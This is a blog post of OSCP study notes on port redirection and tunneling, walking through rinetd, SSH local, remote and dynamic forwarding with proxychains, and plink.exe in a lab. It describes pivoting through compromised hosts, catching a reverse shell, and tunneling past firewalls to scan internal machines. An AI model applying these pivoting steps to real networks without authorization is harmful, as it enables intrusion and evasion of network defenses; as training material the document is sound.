---
layout: post
title:  "OSCP Origin Part 20"
author: haran
categories: [oscp , security , oscp_origin]
image: post_img/oscp_origin/oscp.png
beforetoc: "Port redirection and tunneling"
toc: true
comments: false
rating: 3.5
---

Port redirection and tunneling

20. Port Redirection and Tunneling

20. Port Redirection and Tunneling 

• In this module, we will demonstrate various forms of port redirection, tunneling, and traffic encapsulation.

• Understanding and mastering these techniques will provide us with the surgical tools needed to manipulate the directional flow of targeted traffic, which can often be useful in restricted network environments.

• However, this will require extreme concentration as this module is admittedly a bit of a brain twister.

• Tunneling a protocol involves encapsulating it within a different protocol.

• By using various tunneling techniques, we can carry a given protocol over an incompatible delivery network, or provide a secure path through an untrusted network.

• Port forwarding and tunneling concepts can be difficult to digest, so we will work through several hypothetical scenarios to provide a clearer understanding of the process. 

• Take time to understandeach scenario before advancing to the next.


20.1 Port Forwarding

20.1 Port Forwarding

• Port forwarding is the simplest traffic manipulation technique we will examine in which we redirect traffic destined for one IP address and port to another IP address and port.

20.1.1 RINETD


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/1.jpg)

• accessed internet connected linux web server (kali).

• Linux client doesnot have internet connectivity.

• To begin, we will start with a relatively simple port forwarding example based on the following scenario.

• During an assessment, we gained root access to an Internet-connected Linux web server. 

• From there, we found and compromised a Linux client on an internal network, gaining access to SSH credentials.

• In this fairly-common scenario, our first target, the Linux web server, has Internet connectivity, bu tthe second machine, the Linux client, does not.

• We were only able to access this client by pivoting through the Internet-connected server.

• In order to pivot again, this time from the Linux client, and begin assessing other machines on the internal network, we must be able to transfer tools from our attack machine and ex filtrate data to it as needed. 

• Since this client can not reach the Internet directly, we must use the compromised Linux web server as a go-between, moving data twice and creating a very tedious 
 data-transfer process.

• We can use port forwarding techniques to ease this process.

• To recreate this scenario, our Internet connected Kali Linux virtual machine will stand in as the compromised Linux web server and ourdedicated Debian Linux box as the internal, Internet-disconnected Linux client.

• Our environment will look something like this:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/2.jpg)

• As configured, our Kali machine can access the Internet, and the client can not.

• We can validate connectivity from our Kali machine by pinging google.com and  connecting to that IP with nc -nvv 216.58.207.142 80:


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/3.jpg)

kali@kali:~$ ping google.com -c 1
PING google.com (216.58.207.142) 56(84) bytes of data.
64 bytes from muc11s03-in-f14.1e100.net (216.58.207.142): icmp_seq=1 ttl=128 time=26.4
ms
--- google.com ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 26.415/26.415/26.415/0.000 ms
kali@kali:~$ root@kali:~# nc -nvv 216.58.207.142 80
(UNKNOWN) [216.58.207.142] 80 (http) open
GET / HTTP/1.0
HTTP/1.0 200 OK
Date: Mon, 26 Aug 2019 15:38:42 GMT
Expires: -1
Cache-Control: private, max-age=0
...
...

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/4.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/5.jpg)

• kali attack machine has internet access.

• As expected, our Kali attack machine has access to the Internet.

•  Next, we will SSH to the compromised Linux client and test Internet connectivity from there, again with Netcat.

•  Note that we again use the IP address, since an actual, Internet-disconnected internal network may not have a working external DNS.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/6.jpg)

kali@kali:~# ssh student@10.11.0.128
student@10.11.0.128's password:
Linux debian 4.9.0-6-686 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) i686
...
student@debian:~$ nc -nvv 216.58.207.142 80
(UNKNOWN) [216.58

• This time, the Internet connection test failed, indicating that our Linux client is indeed disconnectedfrom the Internet. 

• In order to transfer files to an Internet-connected host, we must first transfer them to the Linux web server and then transfer them again to our intended destination.

 Note that in a real penetration testing environment, our goal is most likely to transfer files to our Kali attack machine (not necessarily through it as in this scenario) but the concepts are the same.

• Instead, we will use a port forwarding tool called rinetd to redirect traffic on our Kali Linux server.

• This tool is easy to configure, available in the Kali Linux repositories, and is easily installed with apt:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/7.jpg)

• proofed that our linux client doesnot have internet access.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/8.jpg)

kali@kali:~$ sudo apt update && sudo apt install rinetd



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/9.jpg)

• The rinetd configuration file, /etc/rinetd.conf, lists forwarding rules that require four parameters,including bind address and bindport, which define the bound (“listening”) IP address and port, and connect address and connectport, which define the traffic’s destination address and port:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/10.jpg)

kali@kali:~$ cat /etc/rinetd.conf
...
# forwarding rules come here
#
# you may specify allow and deny rules after a specific forwarding rule
# to apply to only that forwarding rule
#
# bindadress bindport connectaddress connectport

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/11.jpg)

•  For example, we can use rinetd to redirect any traffic received by the Kali web server on port 80 to the google.com IP address we used in our tests.

•  To do this, we will edit the rinetd configuration file and specify the following forwarding rule:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/12.jpg)

kali@kali:~$ cat /etc/rinetd.conf
...
# bindadress bindport connectaddress connectport
0.0.0.0 80 216.58.207.142 80
...

• This rule states that all traffic received on port 80 of our Kali Linux server, listening on all interfaces(0.0.0.0), regardless of destination address, will be redirected to 216.58.207.142:80. This is exactly what we want. 

• 216.58.207.142:80. - linux client

• We can restart the rinetd service with service and confirm that the service is listening on TCP port 80 with ss (socket statistics):

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/13.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/14.jpg)

kali@kali:~$ sudo service rinetd restart
kali@kali:~$ ss -antp | grep "80"
LISTEN 0 5 0.0.0.0:80 0.0.0.0:* users:(("rinetd",pid=1886,fd=4))

Excellent! The port is listening. For verification, we can connect to port 80 on our Kali Linux virtual machine:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/15.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/16.jpg)

student@debian:~$ nc -nvv 10.11.0.4 80
(UNKNOWN) [10.11.0.4] 80 (http) open
GET / HTTP/1.0
HTTP/1.0 200 OK
Date: Mon, 26 Aug 2019 15:46:18 GMT
Expires: -1
Cache-Control: private, max-age=0
Content-Type: text/html; charset=ISO-8859-1
P3P: CP="This is not a P3P policy! See g.co/p3phelp for more info."
Server: gws
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
Set-Cookie: 1P_JAR=2019-08-26-15; expires=Wed, 25-Sep-2019 15:46:18 GMT; path=/; domai
n=.google.com
Set-Cookie: NID=188=Hdg-h4aalehFQUxAOvnI87Mtwcq80i07nQqBUfUwDWoXRcqf43KYuCoBEBGmOFmyu0
kXyWZCiHj0egWCfCxdote0ScMX6ArouU2jF4DZeeFHBhqZCvLJDV3ysgPzerRkk9pcLi7HEnbeeEn5xR9BgWfz
4jvZkjnzYDwlfoL2ivk; expires=Tue, 25-Feb-2020 15:46:18 GMT; path=/; domain=.google.com
; HttpOnly
...

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/17.jpg)

internet disconnected thing to internet connected host.
changing the conect address and connect port.

• The connection to our Linux server was successful, and we performed a successful GET request against the web server.

•  As evidenced by the Set-Cookie field, the connection was forwarded properly and we have, in fact, connected to Google’s web server.

• We can now use this technique to connect from our previously Internet-disconnected Linux client,through the Linux web server, to any Internet-connected host by simply changing the connect address and connect port fields in the web server’s /etc/rinetd.conf file.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/18.jpg)

 This is one of the more basic scenarios in this module. Be sure to take time to complete the exercises and understand these concepts before proceeding.

20.1.1.1 Exercises

1. Connect to your dedicated Linux lab client and run the clear_rules.sh 
  script from /root/port_forwarding_and_tunneling/ as root.

2. Attempt to replicate the port-forwarding technique covered in the above scenario.
20.2 SSH Tunneling


• The SSH protocol is one of the most popular protocols for tunneling and port forwarding

• This is due to its ability to create encrypted tunnels with in the SSH protocol, which supports bidirectional communication channels. 
 
• This obscure feature of the SSH protocol has far-reaching implications for both penetration testers and system administrators.
20.2.1 SSH Local Port Forwarding


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/19.jpg)

• SSH local port forwarding allows us to tunnel a local port to a remote server using SSH as the transport protocol.

•  The effects of this technique are similar to rinetd port forwarding, with a few twists.

• Let’s take another scenario into consideration. 

• During an assessment, we have compromised a Linux-based target through a remote vulnerability, elevated our privileges to root, and gained access to the passwords for both the root and student users on the machine.

•  This compromised machine does not appear to have any outbound traffic filtering, and it only exposes SSH (port 22), RDP (port3389), and the vulnerable service port, which are also allowed on the firewall.

• After enumerating the compromised Linux client, we discover that in addition to being connected to the current network (10.11.0.x), it has another network interface that seems to be connected toa different network (192.168.1.x). 

• In this internal subnet, we identify a Windows Server 2016 machine that has network shares available.

• To simulate this configuration in our lab environment, we will run the ssh_local_port_forwarding.sh script from our dedicated Linux client:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/20.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/21.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/22.jpg)

root@debian:~# cat /root/port_forwarding_and_tunneling/ssh_local_port_forwarding.sh
#!/bin/bash
# Clear iptables rules
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -F
iptables -X
# SSH Scenario
iptables -F
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 3389 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 8080 -m state --state NEW -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
root@debian:~# /root/port_forwarding_and_tunneling/ssh_local_port_forwarding.sh

• In such a scenario, we could move the required attack and enumeration tools to the compromised Linux machine and then attempt to interact with the shares on the 2016 server, but this is neither elegant nor scalable.

• Instead, we want to interact with this new target from our Internet-based Kali attack machine, pivoting through this compromised Linux client.

• This way, we will have access toall of the tools on our Kali attack machine as we interact with the target.

• This will require some port-forwarding magic, and we will use the ssh client’s local port forwarding feature (invoked with ssh -L) to help with this.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/23.jpg)

• tries to interact with windows server through compromised kali machine.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/24.jpg)

ssh -N -L [bind_address:]port:host:hostport [username@address]




![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/25.jpg)

• Inspecting the manual of the ssh client (man ssh), we notice that the -L parameter specifies theport on the local host that will be forwarded to a remote address and port.

• In our scenario, we want to forward port 445 (Microsoft networking without NetBIOS) on our Kali machine to port 445 on the Windows Server 2016 target. 

• When we do this, any Microsoft file sharing queries directed at our Kali machine will be forwarded to our Windows Server 2016 target.

• This seems impossible given that the firewall is blocking traffic on TCP port 445, but this port forward is tunneled through an SSH session to our Linux target on port 22, which is allowed through the firewall. 

• In summary, the request will hit our Kali machine on port 445, will be forwarded acrossthe SSH session, and will then be passed on to port 445 on the Windows Server 2016 target.


• If done correctly, our tunneling and forwarding setup will look something like Figure 298:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/26.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/27.jpg)

• To pull this off, we will execute an ssh command from our Kali Linux attack machine.

• We will nottechnically issue any ssh commands (-N) but will set up port forwarding (with -L), bind port 445 on our local machine (0.0.0.0:445) to port 445 on the Windows Server (192.168.1.110:445) and do this through a session to our original Linux target, logging in as student(student@10.11.0.128):'

• firewall blocking on tcp port 445 from accessing in windows server.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/28.jpg)

kali@kali:~$ sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
student@10.11.0.128's password:


• At this point, any incoming connection on the Kali Linux box on TCP port 445 will be forwarded to TCP port 445 on the 192.168.1.110 IP address through our compromised Linux client.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/29.jpg)

kali@kali:~$ sudo nano /etc/samba/smb.conf
kali@kali:~$ cat /etc/samba/smb.conf
...
Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
; write list = root, @lpadmin
min protocol = SMB2
kali@kali:~$ sudo /etc/init.d/smbd restart
[ ok ] Restarting smbd (via systemctl): smbd.service.

• Finally, we can try to list the remote shares on the Windows Server 2016 machine by pointing the request at our Kali machine.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/30.jpg)

• Before testing this, we need to make a minor change in our Samba configuration file to set the minimum SMB version to SMBv2 by adding “min protocol = SMB2” to the end of the file as shownin Listing 635. 

• This is because Windows Server 2016 no longer supports SMBv1 by default.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/31.jpg)

• windows server 2016 no longer support smb server v1 default.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/32.jpg)

• We will use the smbclient utility, supplying the IP address or NetBIOS name, in this case our localmachine (-L 127.0.0.1) and the remote user name (-U Administrator). 

• If everything goesaccording to plan, after we enter the remote password, all the traffic on that port will be redirected to the Windows machine and we will be presented with the available shares:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/33.jpg)

kali@kali:~# smbclient -L 127.0.0.1 -U Administrator
Unable to initialize messaging context
Enter WORKGROUP\Administrator's password:
 Sharename Type Comment
 --------- ---- -------
 ADMIN$ Disk Remote Admin
 C$ Disk Default share
 Data Disk
 IPC$ IPC Remote IPC
 NETLOGON Disk Logon server share
 SYSVOL Disk Logon server share
Reconnecting with SMB1 for workgroup listing.
 Server Comment
 --------- -------
 Workgroup Master
 --------- -------

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/34.jpg)

• Not only was the command successful but since this traffic was tunneled through SSH, the entiretransaction was encrypted.

•  We can use this port forwarding setup to continue to analyze the target server via port 445, or forward other ports to conduct additional reconnaissance.


20.2.1.1 Exercises


1. Connect to your dedicated Linux lab client and run the clear_rules.sh script from/root/port_forwarding_and_tunneling/ as root.

2. Run the ssh_local_port_forwarding.sh script from /root/port_forwarding_and_tunneling/ asroot.

3. Take note of the Linux client and Windows Server 2016 IP addresses shown in the StudentControl Panel.

4. Attempt to replicate the smbclient enumeration covered in the above scenario.
20.2.2 SSH Remote Port Forwarding


20.2.2 SSH Remote Port Forwarding

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/35.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/36.jpg)

• The remote port forwarding feature in SSH can be thought of as the reverse of local port forwarding,in that a port is opened on the remote side of the connection and traffic sent to that port is forwarded to a port on our local machine 
 (the machine initiating the SSH client).

• In short, connections to the specified TCP port on the remote host will be forwarded to the specified port on the local machine. 

• This can be best demonstrated with a new scenario.

• In this case, we have access to a non-root shell on a Linux client on the internal network. 

• On this compromised machine, we discover that a MySQL server is running on TCP port 3306. 

• Unlike the previous scenario, the firewall is blocking inbound TCP port 22 (SSH) connections, so we can’t SSH into this server from our Internet-connected Kali machine.

• We can, however, SSH from this server out to our Kali attacking machine, since out bound TCP port 22 is allowed through the firewall.

• We can leverage SSH remote port forwarding (invoked with ssh-R) to open a port on our Kali machine that forwards traffic to the MySQL port (TCP 3306) on theinternal server.

• All forwarded traffic will traverse the SSH tunnel, right through the firewall.

• SSH port forwards can be run as non-root users as long as we only bind unused 
  non- privileged local ports (above 1024)

• In order to simulate this scenario, we will run the ssh_remote_port_forwarding.sh script on ourdedicated Linux client:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/37.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/38.jpg)

root@debian:~# cat /root/port_forwarding_and_tunneling/ssh_remote_port_forwarding.sh
#!/bin/bash
# Clear iptables rules
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -F
iptables -X
# SSH Scenario
iptables -F
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 3389 -m state --state NEW -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
root@debian:~# /root/port_forwarding_and_tunneling/ssh_remote_port_forwarding.sh


it will only restrict inbound traffic on 3389 and no outbound traffic.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/39.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/40.jpg)

The ssh command syntax to create this tunnel will include the local IP and port, the remote IP and port, and -R to specify a remote forward:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/41.jpg)

ssh -N -R [bind_address:]port:host:hostport [username@address]


-N = nocmmands
-R = forward remote host
10.11.0.4 = kali machine
127.0.0.1 = internal linux machine forwarded by kali

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/42.jpg)

student@debian:~$ ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
kali@10.11.0.4's password:

 
• In this case, we will ssh out to our Kali machine as the kali user (kali@10.11.0.4), specify no commands (-N), and a remote forward (-R). 

• We will open a listener on TCP port 2221 on our Kalimachine (10.11.0.4:2221) and forward connections to the internal Linux machine’s TCP port3306 (127.0.0.1:3306)

kali is all incoming traffic to 
10.11.0.4 : 2221 ------→  127.0.0.1:3306

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/43.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/44.jpg)

• This will forward all incoming traffic on our Kali system’s local port 2221 to port 3306 on the compromised box through an SSH tunnel (TCP 22), allowing us to reach the MySQL port eventhough it is filtered at the firewall.

Our connections can be illustrated as shown in Figure 299:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/45.jpg)

• With the tunnel up, we can switch to our Kali machine, validate that TCP port 2221 is listening, and scan the localhost on that port with nmap, which will fingerprint the target’s MySQL service:

kali@kali:~$ ss -antp | grep "2221"
LISTEN 0 128 127.0.0.1:2221 0.0.0.0:* users:(("sshd",pid=2294,fd=9))
LISTEN 0 128 [::1]:2221 [::]:* users:(("sshd",pid=2294,fd=8))

kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 2221
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000039s latency).
PORT STATE SERVICE VERSION
2221/tcp open mysql MySQL 5.5.5-10.1.26-MariaDB-0+deb9u1
Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds


• Knowing that we can scan the port, we should have no problem interacting with the MySQL service across the SSH tunnel using any of the appropriate Kali-installed tools.



20.2.2.2 Exercises


1. Connect to your dedicated Linux lab client via SSH and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.

2. Close any SSH connections to your dedicated Linux lab client and then connect as thestudent account using rdesktop and run the ssh_remote_port_forward.sh script from
 /root/port_forwarding_and_tunneling/ as root.

3. Attempt to replicate the SSH remote port forwarding covered in the above scenario andensure that you can scan and interact with the MySQL service.
20.2.3 SSH Dynamic Port Forwarding


20.2.3 SSH Dynamic Port Forwarding


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/46.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/47.jpg)

we compromised linux client s.t.u.v
no inbound or outbound rules in the firewall.


• Now comes the really fun part. 

• SSH dynamic port forwarding allows us to set a local listening port and have it tunnel incoming traffic to any remote destination through the use of a proxy.

• In this scenario (similar to the one used in the SSH local port forwarding section), we have compromised a Linux-based target and have elevated our privileges. 

• There do not seem to be any inbound or outbound traffic restrictions on the firewall.

• After further enumeration of the compromised Linux client, we discover that in addition to being connected to the current network (10.11.0.x), it has an additional network interface that seems to be connected to a different network (192.168.1.x). 

• On this internal subnet, we have identified a Windows Server 2016 machine that has network shares available.

• In the local port forwarding section, we managed to interact with the available shares on the Windows Server 2016 machine; however, that technique was limited to a particular IP address and port. 

• In this example, we would like to target additional ports on the Windows Server 2016 machine,or hosts on the internal network without having to establish different tunnels for each port or host of interest.

• To simulate this scenario in our lab environment, we will again run the ssh_local_port_forwarding.

• shscript from our dedicated Linux client.

• Once the environment is set up, we can use ssh -D to specify local dynamic SOCKS4 application level port forwarding (again tunneled within SSH) with the following syntax:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/48.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/49.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/50.jpg)

multiple host in the internal network.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/51.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/52.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/53.jpg)

ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>


kali@kali:~$ sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
student@10.11.0.128's password:

• With the above syntax in mind, we can create a local SOCKS4 application proxy (-N -D) on our Kali Linux machine on TCP port 8080 (127.0.0.1:8080) 

• which will tunnel all incoming traffic to any host in the target network, through the compromised Linux machine, which we log into as student(student@10.11.0.128):


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/54.jpg)

• Although we have started an application proxy that can route application traffic to the target network through the SSH tunnel, we must some how direct our reconnaissance and attack tools to use this proxy.

• We can run any network application through HTTP, SOCKS4, and SOCKS5 proxies with the help of ProxyChains.

To configure ProxyChains, we simply edit the main configuration file (/etc/proxychains.conf) andadd our SOCKS4 proxy to it:

configure proxy chains

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/55.jpg)

kali@kali:~$ cat /etc/proxychains.conf
...
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 127.0.0.1 8080

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/56.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/57.jpg)

• To run our tools through our SOCKS4 proxy, we prepend each command with proxy chains.

• For example, let’s attempt to scan the Windows Server 2016 machine on the internal target networkusing nmap.

• In this example, we aren’t supplying any options to proxychains except for the nmap command and its arguments:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/58.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/59.jpg)

kali@kali:~$ sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.60 ( https://nmap.org ) at 2019-04-19 18:18 EEST
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:443-<--timeout
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:23-<--timeout
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:80-<--timeout
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:8080-<--timeout
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:445-<><>-OK
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:135-<><>-OK
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:139-<><>-OK
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:22-<--timeout
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:3389-<><>-OK
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:1723-<--timeout
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:21-<--timeout
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:5900-<--timeout
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:111-<--timeout
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:25-<--timeout
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:53-<><>-OK
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:993-<--timeout
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:3306-<--timeout
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:143-<--timeout
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:995-<--timeout
|S-chain|-<>-127.0.0.1:8080-<><>-192.168.1.110:110-<--timeout
Nmap scan report for 192.168.1.110
Host is up (0.17s latency).
PORT STATE SERVICE
21/tcp closed ftp
22/tcp closed ssh
23/tcp closed telnet
25/tcp closed smtp
53/tcp open domain
80/tcp closed http
110/tcp closed pop3
111/tcp closed rpcbind
135/tcp open msrpc
139/tcp open netbios-ssn
143/tcp closed imap
443/tcp closed https
445/tcp open microsoft-ds
993/tcp closed imaps
995/tcp closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp open ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy
Nmap done: 1 IP address (1 host up) scanned in 3.54 seconds

• In Listing , ProxyChains worked as expected, routing all of our traffic to the various ports dynamically, without having to supply individual port forwards.

• By default, ProxyChains will attempt to read its configuration file first from the current directory, 

• then from the user’s $(HOME)/.proxychains directory, and 

• finally from /etc/proxychains.conf. This allows us to run tools through multiple dynamic tunnels, depending on our needs.





20.2.3.1 Exercises


1.Connect to your dedicated Linux lab client and run the clear_rules.sh script from
/root/port_forwarding_and_tunneling/ as root.

2.Take note of the Linux client and Windows Server 2016 IP addresses.

3.Create a SOCKS4 proxy on your Kali machine, tunneling through the Linux target.

4.Perform a successful nmap scan against the Windows Server 2016 machine through theproxy.

5.Perform an nmap SYN scan through the tunnel. Does it work? Are the results accurate?
20.3 PLINK.exe

20.3 PLINK.exe (pivoting through windows based system)


• Up to this point, all the port forwarding and tunneling methods we’ve used have centered around tools typically found on *NIX systems.
 
• Next, let’s investigate how we can perform port forwarding and tunneling on 
  Windows-based operating systems.

• To demonstrate this, assume that we have gained access to a Windows 10 machine during our assessment through a vulnerability in the Sync Breeze software and have obtained a SYSTEM-levelreverse shell.

kali@kali:~$ sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 49937
Microsoft Windows [Version 10.0.16299.309]
(c) 2017 Microsoft Corporation. All rights reserved.
C:\Windows\system32>

• During the enumeration and information gathering process, we discover a MySQL service running on TCP port 3306.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/60.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/61.jpg)

C:\Windows\system32>netstat -anpb TCP
netstat -anpb TCP
Active Connections
 Proto Local Address Foreign Address State
 TCP 0.0.0.0:80 0.0.0.0:0 LISTENING
[syncbrs.exe]
 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING
 RpcSs
[svchost.exe]
 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING
Can not obtain ownership information
 TCP 0.0.0.0:3306 0.0.0.0:0 LISTENING
[mysqld.exe]


• We would like to scan this database or interact with the service.

•  However, because of the firewall, we cannot directly interact with this service from our Kali machine.

• We will transfer plink.exe, a Windows-based command line SSH client
 (part of the PuTTY project) to the target to overcome this limitation.

• The program syntax is similar to the UNIX-based ssh client:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/62.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/63.jpg)

ftp -v -n -s:ftp.txt

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/64.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/65.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/66.jpg)

C:\Tools\port_redirection_and_tunneling> plink.exe
plink.exe
Plink: command-line connection utility
Release 0.70
Usage: plink [options] [user@]host [command]
 ("host" can also be a PuTTY saved session name)
 Options:
 -V print version information and exit
 -pgpfp print PGP key fingerprints and exit
 -v show verbose messages
 -load sessname Load settings from saved session
 -ssh -telnet -rlogin -raw -serial
 force use of a particular protocol
 -P port connect to specified port
 -l user connect with specified username
 -batch disable all interactive prompts
 -proxycmd command
 use 'command' as local proxy
 -sercfg configuration-string (e.g. 19200,8,n,1,X)
 Specify the serial configuration (serial only)
The following options only apply to SSH connections:
 -pw passw login with specified password
 -D [listen-IP:]listen-port
 Dynamic SOCKS-based port forwarding
 -L [listen-IP:]listen-port:host:port
 Forward local port to remote address
 -R [listen-IP:]listen-port:host:port
 Forward remote port to local address
 -X -x enable / disable X11 forwarding
 -A -a enable / disable agent forwarding
 -t -T enable / disable pty allocation

• We can use plink.exe to connect via SSH (-ssh) to our Kali machine (10.11.0.4) as the kali user(-l kali) with a password of “ilak” (-pw ilak) to create a remote port forward 
 (-R) of port 1234(10.11.0.4:1234) to the MySQL port on the Windows target (127.0.0.1:3306) with the followingcommand:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/67.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/68.jpg)

• However, since this will most likely not work with the interactivity level we have in a typical reverse shell, we should pipe the answer to the prompt with the cmd.exe /c echo y command. 

• From our reverse shell, then, this command will successfully establish the remote port forward without any interaction:



C:\Tools\port_redirection_and_tunneling> plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:
1234:127.0.0.1:3306 10.11.0.4


• The first time plink connects to a host, it will attempt to cache the host key in the registry. 

• If we runthe command through an rdesktop connection to the Windows client, we can see this interactive step

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/69.jpg)

C:\Tools\port_redirection_and_tunneling> cmd.exe /c echo y | plink.exe -ssh -l kali -p
w ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R 10.11.0.4:1234:127.0.0.1:3306 1
